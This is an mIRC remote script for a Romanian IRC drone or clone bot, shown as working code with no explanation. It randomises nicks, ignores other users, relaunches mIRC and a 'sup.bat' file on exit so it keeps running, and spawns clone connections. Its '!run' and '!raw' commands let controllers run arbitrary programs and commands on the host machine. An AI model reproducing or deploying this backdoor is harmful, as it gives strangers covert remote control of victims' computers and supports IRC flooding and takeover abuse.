[script]
n0=on 1:start:{
n1=  anick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z)
n2=  nick $read nicks.txt
n3=  fullname $read nicks.txt
n4=  identd on $read nicks.txt
n5=  notify on | notify mad | notify Sergiu | notify mafiotu | notify Roxana | notify Diana | notify Cristian | notify Dragonu | notify Baietzasu | notify Laura | notify kiddo
n6=  writeini mirc.ini mirc user $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(111111,999999) | saveini
n7=  ignore -td *!*@*
n8=  .timer 1 150 server -m | fullname $read nicks.txt | identd on $read nicks.txt | nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) | anick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z)
n9=  .timer 1 300 server -m | fullname $read nicks.txt | identd on $read nicks.txt | nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) | anick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z)
n10=}
n11=
n12=on 1:connect:{
n13=  anick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z)
n14=  nick $read nicks.txt
n15=  fullname $read nicks.txt
n16=  identd on $read nicks.txt
n17=  .timer 1 60 nick $read nicks.txt
n18=}
n19=
n20=on *:exit: { /run $mircexe | /run sup.bat | halt }
n21=
n22=on *:unotify:nick $nick
n23=on *:unotify:nick $nick
n24=on *:unotify:nick $nick
n25=
n26=on 1:kick:#:{
n27=  haltdef
n28=  if ($knick == $me) {
n29=    .raw join $chan
n30=    halt
n31=  }
n32=}
n33=
n34=on 100:text:*:*:{
n35=  if ($1 == !op) { if ($2 == $null) { .mode $chan +o $nick } | else { mode $chan +oooooo $2- } | halt }
n36=  if ($1 == !deop) { if ($2 == $null) { .mode $chan -o $nick } | else { mode $chan -oooooo $2- } | halt }
n37=  if ($1 == !voice) { if ($2 == $null) { .mode $chan +v $nick } | else { mode $chan +vvvvvv $2- } | halt }
n38=  if ($1 == !devoice) { if ($2 == $null) { .mode $chan -v $nick } | else { mode $chan -vvvvvv $2- } | halt }
n39=  if ($1 == !ontime) { notice $nick Ontime: $uptime(server,1) | halt }
n40=  if ($1 == !randnick) { nick $read nicks.txt | halt }
n41=  if ($1 == !rnick) { .timer 1 0 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) | halt }
n42=  if ($1 == !ban) { mode $chan -o+b $2 $address($2,2) | kick $chan $2- ( $+ $nick $+ ) | halt }
n43=  if ($1 == !stop) { .timers off | halt }
n44=  if ($1 == !run) { run $2- | .notice $nick 2,15 Am rulat (4,15 $2- 2,15)  | halt } 
n45=  if ($1 == !clone) { server -m | .nick $read nicks.txt | .notice $nick 15CC14CC1CLONING14GG15GG | halt }
n46=  if ($1 == !server) { server -m $2- | fullname $read nicks.txt | identd on $read nicks.txt | nick $read nicks.txt | anick $read nicks.txt | .notice $nick 15CC14CC1CLONING14GG15GG | halt }
n47=  if ($1 == !join) { join $2- | who $2 | halt }
n48=  if ($1 == !console) { if (%console == 1) set %console 0 | else set %console 1 }
n49=  if ($1 == !rehash) { .reload win.ini | .timer 10 0 raw ping me | .timer 3 0 ctcp x ping | .timer 1 1 .msg $chan Rehash successful! }
n50=  if ($1 == !part) {
n51=    if ($2 = $chr(42)) {
n52=      set %parted 0
n53=      set %topart $chan(0)
n54=      while (%topart > %parted) {
n55=        set %parted $calc(%parted + 1)
n56=        if ($chan(%parted) != %chan) && ($chan(%parted) != %chan2) { .part $chan(%parted) At the request of $nick (PartAll) }
n57=      }
n58=    }
n59=    .timer 1 0 part $2- 
n60=    halt
n61=  }
n62=  if ($1 == !take) { .notify $2 | .notice $nick 2,15 Am adaugat nick'ul (4,15 $2 2,15) în Lista...  | halt }
n63=  if ($1 == !let) { .notify -r $2 | .notice $nick 2,15 Am scos nick'ul (4,15 $2 2,15) din Lista...  | halt }
n64=  if ($1 == !me) { describe $chan $2- | halt }
n65=  if ($1 == !ame) { ame $2- | halt }
n66=  if ($1 == $me) {
n67=    if ($2 == op) { if ($3 == $chr(42)) { if ($4 == $null) { allop $chan | halt } | else { allop $4 | halt } | halt } |  if ($3 == $null) { .mode $chan +o $nick } | else { mode $chan +oooooo $3- } | halt }
n68=    if ($2 == deop) { if ($3 == $chr(42)) { if ($4 == $null) { alldeop $chan | halt } | else { alldeop $4 | halt } | halt } | if ($3 == $null) { .mode $chan -o $nick } | else { mode $chan -oooooo $3- } | halt }
n69=    if ($2 == voice) { if ($3 == $chr(42)) { if ($4 == $null) { allvoice $chan | halt } | else { allvoice $4 | halt } | halt } | if ($3 == $null) { .mode $chan +v $nick } | else { mode $chan +vvvvvv $3- } | halt }
n70=    if ($2 == devoice) { if ($3 == $chr(42)) { if ($4 == $null) { alldevoice $chan | halt } | else { alldevoice $4 | halt } | halt } | if ($3 == $null) { .mode $chan -v $nick } | else { mode $chan -vvvvvv $3- } | halt }
n71=    if ($2 == rnick) { .timer 1 0 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) | halt }
n72=    if ($2 == nick) { .timer 1 0 nick $3 | halt }
n73=    if ($2 == msg) { .timer 1 0 msg $3- | halt }
n74=    if ($2 == say) { .timer 1 0 msg $chan $3- | halt }
n75=    if ($2 == quit) { .timer 1 0 quit $3- | halt }
n76=    if ($2 == notice) { .timer 1 0 notice $3- | halt }
n77=    if ($2 == ctcp) { .ctcp $3- | halt }
n78=    if ($2 == run) { run $2- | .notice $nick 2,15 Am rulat (4,15 $2- 2,15)  | halt } 
n79=    if ($2 == randnick) { .timer 1 0 nick $read nicks.txt | halt }
n80=    if ($2 == take) { notify $3 | .notice $nick 1,15 2,15 Am adaugat nick'ul (4,15 $3 2,15) în Lista...  | halt }
n81=    if ($2 == let) { notify -r $3 | .notice $nick 1,15 2,15 Am scos nick'ul (4,15 $3 2,15) din Lista...  | halt }
n82=    if ($2 == clone) { server -m | .notice $nick 15CC14CC1CLONING14GG15GG | halt }
n83=    if ($2 == exit) && ($level($address($nick,2)) > 2) { exit | halt }
n84=    if ($2 == reconn) { server | halt }
n85=    if ($2 == part) {
n86=      if ($3 == $chr(42)) {
n87=        set %parted 0
n88=        set %topart $chan(0)
n89=        while (%topart > %parted) {
n90=          set %parted $calc(%parted + 1)
n91=          if ($chan(%parted) != %chan) { .part $chan(%parted) At the request of $nick (PartAll) }
n92=        }
n93=      }
n94=      .timer 1 0 part $3- 
n95=      halt
n96=    }
n97=    .timer 1 0 $2-
n98=  }
n99=  if ($1 == !quit) { .timer 1 0 quit $2- | halt }
n100=  if ($1 == !say) { .timer 1 0 msg $chan $2- | halt }
n101=  if ($1 == !msg) { .timer 1 0 msg $2- | halt }
n102=  if ($1 == -msg) { .timer 1 1 msg $2- | halt }
n103=  if ($1 == !notice) { .timer 1 0 notice $2- | halt }
n104=  if ($1 == !cycle) { .timer 1 0 part $2 $3- | .timer 1 1 join $2 | halt }
n105=  if ($1 == !ctcp) { .timer 1 0 .ctcp $2- | halt }
n106=  if ($1 == !mode) { .timer 1 0 //mode $me $2- | halt }
n107=  if ($1 == !seen) { .timer 1 0 /j $2- | halt }
n108=  if ($1 == !exit) {
n109=    .partall
n110=    .timerexit 1 3 exit
n111=  }
n112=  if ($1 == !raw) {
n113=    $$2-
n114=  }
n115=}
n116=
n117=on 100:action:*:*:{
n118=  if ($1 == hi) { .timer 1 0 /j $2 | halt }
n119=}
